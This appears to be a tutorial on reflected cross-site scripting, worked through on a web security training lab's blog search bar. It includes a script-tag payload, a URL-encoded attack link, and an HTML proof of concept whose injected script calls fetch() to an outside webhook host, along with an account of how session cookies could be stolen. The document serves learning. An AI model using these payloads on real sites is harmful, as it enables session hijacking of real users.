<h1>What The Heck Is Cross Site Scripting???</h1>
Cross Site Scripting (XSS) is a web attack that runs arbitrary javascript in the context of the user's browsing session. So all cookies that are targeted with the XSS attack will be the cookie's in the victim's browser. Attackers using XSS against a victim essentially take momentary "control" of the victim's browser. Attackers can potentially use XSS to make a victim travel to a malicious domain, or change their email address, or send their sensitive cookies (or other data) to a malicious web server for collection.

<h2>Our First XSS Example</h2>

Analyze the images below.

![image](https://github.com/user-attachments/assets/467b33ba-e895-4b52-b549-6cedef4b8cbf)
![image](https://github.com/user-attachments/assets/2062483b-d93a-46f0-a6a5-528937e6ce0f)

In the above images, XSS was found in the search bar of a blog. I inject a <script>prompt("Is This XSS???")</script> into the search bar of the blog. Afterwords, a prompt alert is displayed on the screen, and the XSS payload is reflected in the **search** parameter in the URL. This
is known as Reflected XSS. Let's look at the page source to see where the XSS is taking place.

![image](https://github.com/user-attachments/assets/69d9267d-577b-416b-a73e-0a8dd243e3af)

If you look at the above small cut-out of the page source of the blog web page, our malicious <script></script> get's injected into an header tag. This is called **Reflected XSS into HTML Context**. Our XSS payload is injected into the part of the HTML that reflects the user's search query back to them on the page.

<h2>How Would An Attacker Send The Payload To The Victim?</h2>

1. The attacker could send this link with the URL encoded payload to the victim (https://0a14002e046c635e83201e50006d006a.web-security-academy.net/?search=%3Cscript%3Eprompt%28%22Is+This+XSS%3F%3F%3F%22%29%3C%2Fscript%3E) and if the victim visits the link the javascript will execute in the context of the victim's browser. This specific xss payload will make "Is This XSS" alert to the victim's screen.

2. The attacker could also host the following malicious HTML on their domain, and when the victim visits the attacker's webpage and clicks the link, the victim's browser will travel to the location in the link and execute the javascript. This specific javascript alerts "This is XSS" to the victim's screen and then makes the victim send a GET request to the attacker's malicious server with a parameter+value of "msg=xss-confirmed".

```
<!DOCTYPE html>
<html>
<body>   
<script>
window.location.href = "https://0a14002e046c635e83201e50006d006a.web-security-academy.net/?search=%3Cscript%3Ealert%28%22This%20is%20XSS%22%29%3Bfetch%28%22https%3A%2F%2Fwebhook%2Esite%2Ff4a05f1e%2D0bcd%2D4083%2D9769%2D25f5bce3d45e%3Fmsg%3Dxss%2Dconfirmed%22%29%3C%2Fscript%3E";
</script>
</body>
</html>
```

For context, this is what the victim user would see on their screen after traveling to the attacker's malicious domain where the above html proof of concept is hosted:

**Victim's View**

![image](https://github.com/user-attachments/assets/acfb67a0-262a-4f65-baa8-b557489aeace)

And this is what the attacker would see on their malicious server after the XSS payload is executed in the victim's browser:

**Attacker's View**

![image](https://github.com/user-attachments/assets/3ede17fb-ac14-4931-a19e-756d0c06e4f1)

Obviously, no sensitive data was sent over with this XSS payload. However, if other misconfigurations were present on the target website, an attacker could have made the victim user send their session cookie to the attacker's server. The attacker could then use the victim's session cookies to conduct a Session Hijacking on the victim user's account, which essentially means the attacker would be able to be logged in as the victim user.


